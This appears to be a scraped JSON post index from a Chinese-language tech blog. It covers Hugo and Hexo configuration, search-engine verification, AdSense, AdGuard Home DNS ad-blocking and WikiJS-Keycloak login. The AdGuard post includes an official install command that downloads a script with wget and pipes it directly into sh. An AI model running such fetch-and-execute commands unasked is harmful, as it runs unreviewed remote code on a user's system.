有些網站的 RSS 可能不放在根目錄，例如 localhost:1313/rss/rss.xml\n有這樣的需求，目前 Hugo 沒有比較好的方式能直接生成在指定位置\n可以在 Hugo 轉譯完之後，另外用指令去移動\n\u003e_ terminal 1 mv public/rss.xml public/rss/rss.xml 本站的 Rss 設定時有碰一個小問題\n我不想要左邊選單的頁面(page)被列在 RSS 裡面，只需要有貼文(post)就好\n位在 public/post/rss.xml 這個檔案，剛好就只有貼文的資料\n所以乾脆就在 CICD 的設定內，加上複製檔案蓋掉根目錄的 rss.xml\n\u0026lt;/\u0026gt; yaml 📄 .woodpecker/deploy.yml 1 2 3 4 5 6 7 8 9 10 when: - event: push branch: main steps: - name: build image: hugomods/hugo:dart-sass-go-git commands: - hugo build - cp public/post/rss.xml public/rss.xml 參考來源 官方文件 Configure Hugo Vifly 的博客 从 Material 主题迁移到 Stack 主题 Hugo 論壇 How can I change the RSS URL? ","date":"2025-01-03T16:42:08+08:00","image":"https://raw.githubusercontent.com/gohugoio/gohugoioTheme/master/static/images/hugo-logo-wide.svg","permalink":"https://zonego.tw/post/hugo-rss/","title":"Hugo 設定RSS, ATOM Feed"},{"content":"Hugo 設定檔 設定檔名稱 hugo 的設定檔 hugo.toml (找不到的話可能叫 config.toml)\n在 hugo v0.109.0 版之前設定檔叫config.toml，之後才改成hugo.toml。新的版本兩種名稱都可以生效，不過官方建議換成hugo.toml。\n設定檔位置 單一設定檔 my-project/hugo.toml\nHugo設定檔可以單獨放在專案的任一地方，預設會抓專案根目錄的 hugo.toml 這種方式適合只想有單個設定檔，或是想將設定檔放在非預設位置 可以搭配指令參數--config /path/to/hugo.toml 抓不同位置的設定檔\n放在 config 資料夾內 Hugo 支援在不同環境下使用不同的設定檔\n預設在根目錄的 config 資料夾內可以分環境，如果沒有對應設定，就會套用 _default 裡的預設值\n搭配指令參數--configDir /path/to/config 可以抓不同位置的設定資料夾\n1 2 3 4 5 6 7 8 my-project/ └── config/ ├── _default/ │ └── hugo.toml ├── devlopment/ │ └── hugo.toml └── production/ └── hugo.toml 直接執行hugo server時，會去套用 devlopment 的設定\n執行hugo(相當於hugo build)時，會去套用 production 的設定\n如果這兩種還不夠用，可以在 config 內新增自定的設定資料夾\n1 2 3 4 5 6 my-project/ └── config/ ├── _default/ │ └── hugo.toml └── myenv/ └── hugo.toml 搭配指令參數--environment myenv可以套用 myenv 資料夾內的設定\n設定檔格式 toml, yaml, json 三種格式的設定檔都可以用\n轉換的方式在官方文件 Configure Hugo 中可以參考\nPS：官方的文件紀錄得很詳細，會讓人覺得難上手，不過善用搜尋會很方便\n以本站的設定為例，這邊只有節錄一部分\n\u0026lt;/\u0026gt; toml 📄 hugo.toml 1 2 3 4 5 6 7 8 9 10 11 12 13 # 沒錯 toml 可以用註解 baseurl = \u0026#34;https://zonego.tw\u0026#34; languageCode = \u0026#34;zh-tw\u0026#34; title = \u0026#34;筆記Zone\u0026#34; # Theme i18n support # Available values: en, fr, id, ja, ko, pt-br, zh-cn, zh-tw, es, de, nl, it, th, el, uk, ar defaultContentLanguage = \u0026#34;zh-tw\u0026#34; [outputs] home = [\u0026#39;html\u0026#39;, \u0026#39;rss\u0026#39;] ... \u0026lt;/\u0026gt; yaml 📄 hugo.yml 1 2 3 4 5 6 7 8 9 10 11 12 baseurl : \u0026#34;https://zonego.tw\u0026#34; languageCode : \u0026#34;zh-tw\u0026#34; title : \u0026#34;筆記Zone\u0026#34; defaultContentLanguage : \u0026#34;zh-tw\u0026#34; outputs: home: - html - rss ... 切分設定檔案 預設將設定全部集中在 hugo.toml 單一個檔案中\n優點是設定只要在一個檔案中搜尋就好，不用翻文件看什麼設定放在哪個檔案\n不過設定檔會變很長，編輯器沒有搜尋功能很難找\nHugo 支援將設定檔，用第一層的 key 作為檔名切開，這個功能只有在有用 config 資料夾時才能用\n以前面本站的設定 hugo.toml 為例\n\u0026lt;/\u0026gt; toml 📄 hugo.toml 1 2 3 4 5 6 7 8 9 10 11 12 13 # 沒錯 toml 可以用註解 baseurl = \u0026#34;https://zonego.tw\u0026#34; languageCode = \u0026#34;zh-tw\u0026#34; title = \u0026#34;筆記Zone\u0026#34; # Theme i18n support # Available values: en, fr, id, ja, ko, pt-br, zh-cn, zh-tw, es, de, nl, it, th, el, uk, ar defaultContentLanguage = \u0026#34;zh-tw\u0026#34; [outputs] home = [\u0026#39;html\u0026#39;, \u0026#39;rss\u0026#39;] ... 可以新增一個 outputs.toml 將 [outputs]範圍內的設定單獨切分一個檔案\n1 2 3 4 5 my-project/ └── config/ └── _default/ ├── hugo.toml └── outputs.toml 內容直接寫[outputs]下的設定即可\n\u0026lt;/\u0026gt; toml 📄 outputs.toml 1 home = [\u0026#39;html\u0026#39;, \u0026#39;rss\u0026#39;] 詳細有哪些 key 可以切，請看官方文件\n設定檔分類 Hugo支援用資料夾作設定檔分類\n例如網站設定不同語言的版本，menu可以有多個設定檔\n1 2 3 4 5 6 7 my-project/ └── config/ └── _default/ ├── hugo.toml ├── outputs.toml ├── menus.en.toml └── menus.de.toml 可以加一層資料夾做分類\n1 2 3 4 5 6 7 8 my-project/ └── config/ └── _default/ ├── hugo.toml ├── navigation/ │ ├── menus.en.toml │ └── menus.de.toml └── outputs.toml 參考資料 官方文件 Configure Hugo ","date":"2025-01-02T10:26:29+08:00","image":"https://raw.githubusercontent.com/gohugoio/gohugoioTheme/master/static/images/hugo-logo-wide.svg","permalink":"https://zonego.tw/post/hugo-config/","title":"Hugo 設定檔結構"},{"content":"芫荽 / iansui 第一套為台灣教育使用所改造的繁體硬筆楷書字型\nAn open source Chinese font derived from Klee One (Fontworks).\n基於 Fontworks 的 Klee One 衍生的開源繁體中文字型。\n開源授權規定 除單獨出售字型檔禁止外，任何人可以無償使用此字型，包含商用。無須告知原作者。\n下載 GitHub 下載點\n在 GitHub 專案的 Release 頁面，點最新版本的 iansui.zip 下載\n將 iansui.zip 解壓縮後，找到 Iansui-Regular.ttf 點兩下即可安裝。\n另外也有發音符號的版本 注音芫荽 芫荽的注音字型。 字咍芫荽 台語標音字型家族。 圖片、資訊來源： 美感細胞 教科書再造計畫 GitHub ButTaiwan/iansui ","date":"2024-04-15T10:40:10+08:00","image":"https://github.com/ButTaiwan/iansui/raw/main/img/iansui_cover.jpg","permalink":"https://zonego.tw/post/iansui-font/","title":"芫荽 繁體硬筆楷書字型 Iansui Font"},{"content":"之前寫過讓 Google 主動來爬我們的網站內容，但世界上不只有 google 這個搜尋引擎\n微軟的搜尋引擎 Bing 雖然不是最多人使用，不過為了增加網站曝光，就來設定 Webmaster Tools 吧\n反正設定也不用錢\n其他搜尋引擎請參考\nGoogle Search Console - 讓 Google 搜尋到部落格內容 登入 Microsoft 帳號 註冊就跳過吧，應該大家都會\n真的沒有的話，也可以用 Google 或 FB 帳號登入\n從 Google Search Console 匯入網站 登入後選擇新增站點\n如果之前已經設定過 Google Search Console\n可以連結 Google 帳號，將設定匯入 Bing Webmaster Tools\n由於我的部落格 https://zonego.tw 已經匯入過，所以我的 Google 帳號內會沒有其他網站能匯入\n正常的話這邊選擇網站匯入就可以了\n新增網站至 Webmaster Tools 新增站點這邊輸入網站的網址\n以新增 https://example.zonego.tw 為範例\n下一步就是要驗證網站是你的，有三種驗證方法\n1.BingSiteAuth.xml 下載驗證用的 BingSiteAuth.xml 檔案，放在網站的根目錄\nhttps://example.zonego.tw/BingSiteAuth.xml\n2.在頁面的 Header 加入驗證資料 在網站的所有頁面 Header 中加入驗證碼\n\u0026lt;/\u0026gt; html 1 2 3 4 \u0026lt;head\u0026gt; ... ‹meta name=\u0026#34;msvalidate.01\u0026#34; content=\u0026#34;2218F52174A741F96454DA55D7A664AA\u0026#34; /\u0026gt; \u0026lt;/head\u0026gt; 3.透過DNS驗證網站 在網域的DNS紀錄加入 CNAME 轉至 verify.bing.com\n完成之後，對DNS查詢 82d5e001135888feb5576ef02ef31223.zonego.tw 應該轉至 verify.bing.com\n設定 Sitemap 接下來新增網站的 sitemap 網址，讓微軟的爬蟲知道有哪些公開頁面可以爬資料\n例如我的網站 sitemap 就放在 https://zonego.tw/sitemap.xml\n完成之後等待一段時間，在 Bing 搜尋就會找到我們網站的內容了 🎉\n","date":"2023-10-02T11:14:09+08:00","image":"https://zonego.tw/post/bingwebmastertools/Bing.svg","permalink":"https://zonego.tw/post/bingwebmastertools/","title":"Bing Webmaster Tools - 讓 Bing 搜尋到部落格內容"},{"content":"Gboard 鍵盤 Google 在 Android 出的 Gboard 鍵盤上推出 Emoji Kitchen 功能\nGboard Google Play 商店連結：https://play.google.com/store/apps/details?id=com.google.android.inputmethod.latin\n簡單來說，在可以傳圖片的地方 (如 Discord)，用 Gboard 鍵盤輸入兩個 emiji 就可以將融合後的圖片傳出去\n網頁版 當初只在Gboard 鍵盤上的 Emoji Kitchen 合成功能現在開放網頁版啦\n只要在 Google 搜尋 Emoji Kitchen，組合完表情就產生出圖片了\n網址：https://www.google.com/search?q=emoji+kitchen\n要用時需要將圖片下載下來，或是複製圖片網址使用\n\u0026lt;/\u0026gt; markdown 1 2 3 \u0026lt;!-- 複製圖片網址範例 --\u0026gt; ![](https://www.gstatic.com/android/keyboard/emojikitchen/20201001/u1f914/u1f914_u1f47b.png?fbx) 開源版本 在 Google 還沒開放網頁版功能之前，一些熱心開發者也做出類似的網站可以線上使用\n這邊介紹 xsalazar/emoji-kitchen\n使用時跟 Google 的網頁版一樣，需要將圖片下載下來，或是複製圖片網址使用\nGitHub：https://github.com/xsalazar/emoji-kitchen\nEmoji Kitchen：https://emojikitchen.dev/\n","date":"2023-09-18T12:00:32+08:00","image":"https://zonego.tw/post/emoji-kitchen/emoji_hu_aee8305c6475e281.jpg","permalink":"https://zonego.tw/post/emoji-kitchen/","title":"Emoji Kitchen 自己組合出想要的表情符號"},{"content":"申請 Google 帳號這個步驟就先跳過\n接下來到 AdSense 網站 https://www.google.com/adsense\n套用 AdSense 設定要套用的網站 點新增網站之後，打入網站的連結，例如 https://example.com\n接下來要驗證網站是你的，有兩種方式\n使用 AdSense 程式碼 使用 Ads.txt 驗證 建議使用 Ads.txt 驗證比較省事，如果我們不是用 Ads.txt 驗證網站所有權的話，後面還是要做這一步驟。簡單來說，美國為了保護下廣告的客戶，提供銷售廣告位的網站需要提供 Authorized Digital Sellers (簡稱 ads.txt)\n詳細說明請參考 Google 的 https://support.google.com/adsense/answer/12171612?hl=zh-Hant\n使用 AdSense 程式碼驗證 將 Google 提供的代碼貼到個頁面的 header 即可\nhexo nexmoe 這個主題有提供修改 header 的設定\n修改 _config.nexmoe.yml，在 slotHead: 貼上即可\n\u0026lt;/\u0026gt; yaml 1 2 3 4 ... slotHead: | \u0026lt;script async src=\u0026#34;https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-ID\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; Hugo Stack 主題要修改 Header 也一樣簡單\n在 my-project/layouts/partials/head 資料夾內新增 custom.html\n然後將內容貼進去就可以了\n\u0026lt;/\u0026gt; html 📄 custom.html 1 \u0026lt;script async src=\u0026#34;https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-ID\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 使用 Ads.txt 驗證 複製 google 提供的文字\n\u0026lt;/\u0026gt; txt 1 google.com, pub-XXXXXX, DIRECT, XXXXXXX 如果驗證時不是用這個方式的話，可以重新點網站進去，Google 會產生 ads.txt 的內容可以複製\nHexo 為例子，在 source 資料夾內新增 ads.txt，把剛剛複製的內容貼上\n修改 _config.yml 設定跳渲染 ads.txt (可參考 Hexo 指定文件跳過渲染)\n\u0026lt;/\u0026gt; yml 1 2 3 4 ... skip_render: - ads.txt Hugo 就更簡單了，直接將 ads.txt 放在 my-project/static 資料夾內就可以了\nHugo 就會自動放在網站的根目錄，像 http://localhost:1313/ads.txt\n設定付款資料 付款資料 點左側選單 \u0026gt; 付款 \u0026gt; 付款資訊\n付款帳戶的資料基本上不用管它，想要調整收到前的時間可以改付款時間表，最少需要累積到 100 美金才領的出來\n美國稅籍資料 畢竟 Google 是美國公司，照美國的稅制大概會收 24% 起跳的稅金\n外國人可以申請 W-8BEN 來降低稅收，只有針對美國人銷售、營利才需要收 30% 稅金\n簡單來說假設你的網站有 100 美元的廣告收入，其中有 10% 的廣告收入是來自美國\n稅金 實際收入 正常稅率 (未申請 W-8BEN) 100 * 24% = 24 100 - 24 = 76 有申請 W-8BEN (100 * 10%) * 30% = 3 100 - 3 = 97 所以，除非你的網站或 Youtube 頻道主要都是來自美國，不然申請 W-8BEN 扣的稅會比較少\n我是參考雲爸的教學來填寫 https://dacota.tw/blog/post/google-adsense-w-8ben\n付款資料內的姓名記得填護照的英文姓名，不然需要在另外上傳護照證明稅及跟帳號擁有者是同一人\n付款方式 付款方式要累積到能第一次領錢才能設定\n台灣能使用的有2種方式\n美元支票 電匯 https://lashiblog.com/google-adsense-payments/\n安插廣告 安插廣告到網站裡面有2種作法，自動廣告跟手動廣告\n自動廣告 在左邊選單 廣告 \u0026gt; 按網站 \u0026gt; 選你要啟用自動廣告的網站\n這邊啟用之後就會自動在網站內插入廣告 (因為是自動，廣告可能會插在文中)\n手動插入廣告 在左邊選單 廣告 \u0026gt; 按廣告單元\n在這邊依照合適的版面類型建立廣告，建完之後會有給你廣告的代碼\n代碼大概分為三個部分\n\u0026lt;/\u0026gt; html 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;!--請放在 Header，只需要放一次--\u0026gt; \u0026lt;script async src=\u0026#34;https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-ID\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;!--放在頁面內你想出現廣告的地方，可在頁面內放多次--\u0026gt; \u0026lt;ins class=\u0026#34;adsbygoogle\u0026#34; style=\u0026#34;display:block; text-align:center;\u0026#34; data-ad-layout=\u0026#34;in-article\u0026#34; data-ad-format=\u0026#34;fluid\u0026#34; data-ad-client=\u0026#34;ca-pub-ID\u0026#34; data-ad-slot=\u0026#34;廣告單元ID\u0026#34;\u0026gt;\u0026lt;/ins\u0026gt; \u0026lt;!--放在頁面最後，只需要放一次--\u0026gt; \u0026lt;script\u0026gt; (adsbygoogle = window.adsbygoogle || []).push({}); \u0026lt;/script\u0026gt; 詳細可參考Google的說明https://support.google.com/adsense/answer/9190028?sjid=17637765633261310327-AP\nPhoto by Alexander Grey on Unsplash\n","date":"2023-08-16T15:28:51+08:00","image":"https://zonego.tw/post/adsense/cash_hu_e68fd104b2f4f7f0.jpg","permalink":"https://zonego.tw/post/adsense/","title":"Google AdSense 讓你的網站幫你賺錢"},{"content":"建好一個新網站，在搜尋引擎爬到你的網站之前，理所當然會搜尋不到任何東西\n那 Google 甚麼時候會時候會來爬我的網站? 真的就是隨緣\n要主動讓搜尋引擎認識你的網站? 那就是要去 Google Search Console 設定\n其他搜尋引擎請參考\nBing Webmaster Tools - 讓 Bing 搜尋到部落格內容 新增網站的 Sitemap 去 Google 設定之前，我們需要先將搜尋引擎需要的網站地圖 sitemap.xml 產生出來。\n教學在這 Hexo 自動產生網站的 sitemap\n至於 Hugo 就不用再額外做設定了，預設就生成在 https://yoursite.com/sitemap.xml\n在 Google Search Console 新增網站 註冊 Google 帳號 這部份相信大家都會，跳過\n新增網站 接下來到 Google Search Console 去設定爬蟲來抓我們的網站\nGoogle Search Console 網址： https://search.google.com/search-console\n資源類型分為兩類，網站前置字元代表只索引單一網站，網域則是歸在該網域下的所有網站都會索引。\n沒有特殊需求的話選網站前置字元就好。\n驗證網站 把要索引的網站打進去後，接下來要驗證網站是你的\n下面的驗證方式選一個就好\nHTML 檔案 預設最簡單的驗證方式，只要將 google 提供的驗證用 html 檔案下載，放在 hexo 的目錄即可\n網站部屬之後可以在 https://yoursite.com/googleXXXXXXXXXXXXXXXX.html 看到驗證碼就可以去點驗證了\nHexo 記得在 _config.yml 加入跳過這個檔案的渲染 詳細請看 Hexo 指定文件跳過渲染\n\u0026lt;/\u0026gt; yaml 1 2 skip_render: - googleXXXXXXXXXXXXXXXX.html HTML 標記 在首頁的 Header 內加入驗證碼\nhttps://yoursite.com/index.html\n\u0026lt;/\u0026gt; html 1 \u0026lt;meta name=\u0026#34;google-site-verification\u0026#34; content=\u0026#34;key-XXX\u0026#34; /\u0026gt; Google Analytics 如果你的網站有使用 Google Analytics 的話可以直接點驗整就好，反正也在設定 GA 時也算驗證過網站所有者了\n網域名稱供應商 在 DNS 內加入相同網域的 TXT 紀錄，裡面放驗證碼即可驗證\n如果是 cloud flare 的話就更簡單，只要照著點就好了\n不過設定時要注意衝突\n完成 驗證完之後等待 google 把 sitemap 內的頁面索引完，在 Google 搜尋你的網站可以被搜尋到了\n後續 google 會提是你的網站有什麼問題需要修正，未修正前會被排到搜尋列表的後面\n要被演算法排到前面就需要做 SEO (search engine optimizaton) 了\nPhoto by Mitchell Luo on Unsplash\n","date":"2023-08-02T12:52:15+08:00","image":"https://zonego.tw/post/google-search-console/google_hu_517ff18cc3ef8fa4.jpg","permalink":"https://zonego.tw/post/google-search-console/","title":"Google Search Console - 讓 Google 搜尋到部落格內容"},{"content":"Sitemap 意思為網站地圖，主要是提供給搜尋引擎知道，這個網站有哪些頁面。\n當然，如果你喜歡看原始的 xml 檔，也可以給人看。\nhexo-generator-sitemap GitHub: https://github.com/hexojs/hexo-generator-sitemap\n這個插件在我們部署 hexo 網站時，會自動幫我們產生 sitemap.xml\n安裝 \u003e_ terminal 1 npm install hexo-generator-sitemap --save Hexo 版本對應使用插件的版本\nHexo 插件 Hexo 4 2.x Hexo 3 1.x Hexo 2 0.x 調整設定 修改 Hexo 的設定檔 _config.yml 設定範例:\n\u0026lt;/\u0026gt; yaml 1 2 3 4 5 6 7 8 9 10 11 ... sitemap: path: - sitemap.xml - sitemap.txt template: ./sitemap_template.xml template_txt: ./sitemap_template.txt rel: false tags: true categories: true 參數 說明 path 產生的 sitemap 檔案位置範例的寫法就是 http://localhost:4000/sitemap.xml如果不要生成 txt 格式可以不寫 - sitemap.txt template 用於產生 sitemap.xml 的模版檔案位置 template_txt 用於產生 sitemap.txt 的模版檔案位置(如果不要生成 sitemap.txt 可以不寫) rel 是否在 header 產生 rel-sitemap詳情請看說明 tags 是否產生個別 tag 頁面 categories 是否產生個別分類的頁面 建立模版檔案 預設的 xml 與 txt 格式的模版可以在 github repo 內下載\nxml: https://github.com/hexojs/hexo-generator-sitemap/blob/master/sitemap.xml\ntxt: https://github.com/hexojs/hexo-generator-sitemap/blob/master/sitemap.txt\n下載後放到 Hexo 的目錄即可\n模版檔案的路徑可以自訂\n例如：模版檔案放在 your_hexo_site/template/sitemap.xml\n設定檔 _config.yml 內的模版路徑 template 需要著修改\n\u0026lt;/\u0026gt; yaml 1 2 3 sitemap: ... template: ./template/sitemap.xml 測試安裝 安裝完後啟動伺服器，到 http://localhost:4000/sitemap.xml 看是否有產生 sitemap.xml\n\u003e_ terminal 1 hexo server 產生靜態頁面也會自動產生 sitemap 檔案\n\u003e_ terminal 1 hexo generate 跳過 sitemap 收錄 如果有貼文或頁面想在 sitemap 中隱藏，可以在標頭 (Front-matter) 加 sitemap: false\n例如：\n\u0026lt;/\u0026gt; markdown 1 2 3 4 5 --- title: 隱藏貼文 date: 2020-01-01 sitemap: false --- ","date":"2023-07-26T13:18:46+08:00","image":"https://zonego.tw/post/hexo-sitemap/hexo_hu_8391813d28afa5b.jpg","permalink":"https://zonego.tw/post/hexo-sitemap/","title":"Hexo 自動產生網站的 sitemap"},{"content":"一般檔廣告大家都會使用瀏覽器插，例如 AD Bolck。這邊推薦可以從 DNS 下手\nDNS 檔廣告原理 DNS原理簡介 一般瀏覽網站時，我們常會使用網域名稱 domain，代替只有數字的 IP 作為連線地址\n舉個例子🌰，要去 google 首頁 https://www.google.com ，其中 www.google.com 就是網域名稱\n瀏覽器會先去 DNS 伺服器用網域名稱查出 Google 的伺服器 IP\n知道 IP 後才能連到 Google 的伺服器請求資料\n在這中間，Google 也會順便將要顯示的廣告網址一起送回來\n瀏覽器再照之前的流程，去廣告商的伺服器去抓廣告回來顯示\n想知道更多 DNS 詳細機制，可以參考 Coudflare 寫的說明\nDNS沉洞（DNS sinkhole） 看完原理後，反過來說，只要 DNS 伺服器不能正常把網域名稱換成 IP\n網路就像斷了，只剩直接給 IP 的方式還能連線\n所以只要在 DNS 伺服器動手腳，把廣告的網址設定成錯誤的IP(例如：127.0.0.1)\n廣告就無法正常顯示\n這種作法就叫做 DNS沉洞（DNS sinkhole）\n有幾套可以自己架的 DNS 伺服器軟體可以達到這種效果，如 PI-Hole、 AdGuard Home\n這邊主要介紹 AdGuard Home\nPI-Hole 改天在寫\nAdGuard Home AdGuard Home 官方網站\nAdGuard Home GitHub repo\n附上 AdGuard Home 提供的功能比對表\u0026hellip;\n功能 AdGuard Home Pi-Hole 阻擋廣告與追蹤器 ✅ ✅ 自訂阻擋清單 ✅ ✅ 內建 DHCP server 功能 ✅ ✅ HTTPS 管理介面 ✅ ❌ 需手動設定 lighttpd 上游 DNS 伺服器加密\n(DNS-over-HTTPS, DNS-over-TLS, DNSCrypt) ✅ ❌ (需安裝額外插件) 跨平台支援 ✅ ❌ (需透過 Docker) 支援加密\nDNS-over-HTTPS or DNS-over-TLS server ✅ ❌ (需安裝額外插件) 阻擋惡意網域 ✅ ❌ (需要使用另外的阻擋清單) 家長管控 (阻擋成人網站) ✅ ❌ (需自行設定阻擋清單) 強制搜尋引擎啟用安全搜尋 ✅ ❌ Per-client (device) configuration ✅ ✅ 存取設定 (設定可用 AGH DNS 的名單) ✅ ❌ [不需 root 權限][wiki-noroot]執行 ✅ ❌ 基本上我們只用擋廣告的功能，AdGuardHome 跟 Pi-Hole 選順手好用的就好\n雖說 AdGuard Home 有原生跨平台支援，不過真的要用也是用 Docker 去不同平台執行比較方便\n安裝 AdGuard Home Linux 官方有提供 Linux 系統的自動安裝腳本\n可以用 wget, curl 等工具下載腳本\n\u003e_ terminal 1 wget --no-verbose -O - https://raw.githubusercontent.com/AdguardTeam/AdGuardHome/master/scripts/install.sh | sh -s -- -v 腳本參數：\n-c \u0026lt;channel\u0026gt; 使用特定的安裝渠道，預設是從 release 安裝，可用 development edge beta release -r 重新安裝 AdGuard Home (不可與 -u 一起用) -u 移除 AdGuard Home (不可與 -r 一起用) -v 查看更多安裝時訊息 或是手動下載、安裝\n到 GitHub Release 下載對應 OS 的安裝檔\n例如安裝 Linux x64 版本\n\u003e_ terminal 1 2 3 tar zxvf AdGuardHome_linux_amd64.tar.gz ./AdGuardHome -s install 建議使用剛裝好系統的 VM 來裝 AdGuard Home，方便備份或是避免 port 衝突\nWindows 跟 Linux 手動安裝步驟相同，到 GitHub Release 下載 windows 版本後執行\nDocker AdGuard Home Docker Hub\ndocker 指令：\n\u003e_ terminal 1 2 3 4 5 6 7 8 9 10 11 docker run --name adguardhome\\ --restart unless-stopped\\ -v /my/own/workdir:/opt/adguardhome/work\\ -v /my/own/confdir:/opt/adguardhome/conf\\ -p 53:53/tcp -p 53:53/udp\\ -p 67:67/udp -p 68:68/udp\\ -p 80:80/tcp -p 443:443/tcp -p 443:443/udp -p 3000:3000/tcp\\ -p 853:853/tcp\\ -p 784:784/udp -p 853:853/udp -p 8853:8853/udp\\ -p 5443:5443/tcp -p 5443:5443/udp\\ -d adguard/adguardhome 其中的 Port 設定\n-p 53:53/tcp -p 53:53/udp: 預設 DNS 使用 port -p 67:67/udp -p 68:68/tcp -p 68:68/udp: DHCP 使用 port (如不使用 DHCP 可以跳過) -p 3000:3000/tcp -p 443:443/tcp: AdGuard Home 的管理介面 (如不需設定 HTTPS 可以不用 443 port) -p 80:80/tcp -p 443:443/tcp -p 443:443/udp: DNS-over-HTTPS 使用 port -p 853:853/tcp: DNS-over-TLS 使用 port -p 784:784/udp -p 853:853/udp -p 8853:8853/udp: DNS-over-QUIC 使用 port (只需要設定其中一個或兩個，不需要全都用) -p 5443:5443/tcp -p 5443:5443/udp: DNSCrypt 使用 port. 如果要使用 DHCP server 的功能，建議將讓容器使用主機網路 (需注意 port 衝突)\n\u003e_ terminal 1 2 3 4 5 6 docker run --name adguardhome\\ --restart unless-stopped\\ -v /my/own/workdir:/opt/adguardhome/work\\ ... --network host -d adguard/adguardhome 設定 這邊我是在自己的電腦上用 docker 展示，連線會用 localhost 去連\n實際使用建議獨立裝在其他不常關的電腦或樹梅派，連線就使用 IP 連\n初次設定 網路設定 接下來設定監聽的網卡(透過哪張網卡能存取)，用 Docker 執行建議可以用所有介面\n管理員的監聽介面如果在 docker 沒有使用 80，記得設定成 3000，避免設定完就連不到\nDNS 伺服器監聽介面同上，建議保留預設的 53 Port\n管理帳號設定 設定管理員帳號密碼，建議不要用 root, admin, administor 等常見的管理帳號\n用戶端設定 初次設定完成，這邊可以看一下不同種類客戶端該怎麼設定使用這個 DNS 伺服器\n基本上只要將網路設定裡的 DNS 伺服器，改成這邊監聽的網卡的IP，就可以用 Adguard 過濾網站\n路由器也要套用的話，是去修改路由器的 DHCP 設定，讓子網段自動分配的 DNS 都使用我們架的 Adguard IP\n初次設定完成🎉 接著可以用設定好的管理員帳號登入\n設定上游 DNS 伺服器 在 Adguard Home 中並不會紀錄設定之外的網域及IP的對應\n其他網域就需要去其他的 DNS 伺服器(上游 DNS 伺服器)查詢\nAdguard Home 整理了幾個常用的 DNS 伺服器 https://adguard-dns.io/kb/zh-CN/general/dns-providers/\n這邊推薦可以用 Google DNS 跟 Cloudflare DNS\nGoogle DNS 協定 地址 DNS, IPv4 8.8.8.8 和 8.8.4.4 DNS, IPv6 2001:4860:4860::8888 和 2001:4860:4860::8844 DNS-over-HTTPS https://dns.google/dns-query DNS-over-TLS tls://dns.google Cloudflare DNS 協定 地址 DNS, IPv4 1.1.1.1 和 1.0.0.1 DNS, IPv6 2606:4700:4700::1111 和 2606:4700:4700::1001 DNS-over-HTTPS IPv4 https://dns.cloudflare.com/dns-query DNS-over-HTTPS IPv6 https://dns.cloudflare.com/dns-query DNS-over-TLS tls://1dot1dot1dot1.cloudflare-dns.com 過濾器設定 過濾黑名單 預設黑名單 Adguard Home 預設使用 Adguard 的過濾黑名單\n新增黑名單也很方便\n把想套用的黑名單加進去啟用\n第三方黑名單 要使用第三方黑名單只要有網址也可以匯入\n這邊介紹一款專為臺灣人設計的廣告阻擋規則 LowTechFilter\n提供阻擋台灣常見的簡訊詐騙、釣魚網站和農場文\n簡訊詐騙、釣魚網站 https://filter.futa.gg/hosts.txt 農場文 https://filter.futa.gg/nofarm_hosts.txt 手動過濾規則 可以從主頁到 DNS 查詢紀錄裡去增加封鎖名單，不過缺點是之前要先查詢過\n還沒有用戶端用這個 DNS 伺服器之前，紀錄會是空的\n家長管控 ","date":"2023-02-21T19:42:28+08:00","image":"https://zonego.tw/post/adguardhome/adguardhome_hu_7c2f10f69863848f.jpg","permalink":"https://zonego.tw/post/adguardhome/","title":"AdGuard Home 擋廣告工具"},{"content":"最近在設定 WikiJS 串接 Keycloak 作身分認證時碰到一些問題，所以在這邊做個紀錄\n這邊就跳過安裝過程\n紀錄時使用版本： WikiJS 2.5.296 Keycloak 20.0.3\nKeycloak 設定 挑選你要設定登入的 realm ，這邊我為了不要應用程式的帳號跟 Keycloak 的管理帳號混用，建一個新的 realm 叫做 demo\nrealm 像是用來管理帳號的群組，在這個群組內建好的應用方式都可以透過這些帳號登入\n新增 client 打上 client ID (不可重複) ，next 下一步\n這邊 Client authentication 必須要勾選，才會產生後面要用到的 Client Secret。點 Save 儲存\n設定 client 打開剛剛建好的 client wiki\n下滑到 Access Setting\n假設我們的 wikijs 網址是 https://wiki.example.com\n填入URL 說明 Root URL https://wiki.example.com 網站根網址 Home URL https://wiki.example.com 登入後重導向的根網址 (通常跟 root url 相同) Valid rediect URIs /XXXXXXXX/callback/* 允許重導向頁面網址\n用 * 可以代表所有頁面，但要注意安全性 Valid post logout https://wiki.example.com 允許登出後轉向的頁面 redirect URIs /* 允許登出後的重導向位置 Web origins 允許 CORS origins 的網址 Valid rediect URIs 可以在後面設定 wikijs 時取得\n如果你的 Keycloak 有安裝客製主題，可以在 Login settings 裡修改\nCredentials 分頁有後續會用到的 client key，可以先複製\nWikijs 設定 進到設定後選認證 \u0026gt; 新增登入機制\n選擇 Keycloak\n再來填入你的 Keycloak 網址、realm 名稱跟剛剛建好的 Client ID\n下面4個網址可以參考 wikijs 的提示，不過左邊的 /auth 要去掉，例如：\n1 2 3 4 5 wikij 提示 https://KEYCLOAK-HOST/auth/realms/YOUR-REALM/protocol/openid-connect/auth 左邊的 /auth 去掉，範例的 realms 是 demo https://your.keycloak-host.com/realms/demo/protocol/openid-connect/auth Client Secret 貼上 Keycloak Credentials 內複製的金鑰\n開放自由註冊可以斟酌打開，若沒開沒登入過的帳號會無法登入\n最下面可以取得 keycloak 設定需要的 Valid rediect URI\n只需要填 /login/a28088b1-8e47-4d16-aa6f-0a32d8af192f/callback\n設定完記得卷到上面點套用設定\n問題排除 登出時遇到 invalid parameter redirect_uri keycloak 在 18 版之後就不支援登出時使用redirect_uri參數，所以只能先暫時先把 WikiJS 的同步登出先關閉，等 WikiJS 更新\n關閉後的缺點是在同一台裝置，session 未過期前，點一下 keycloak 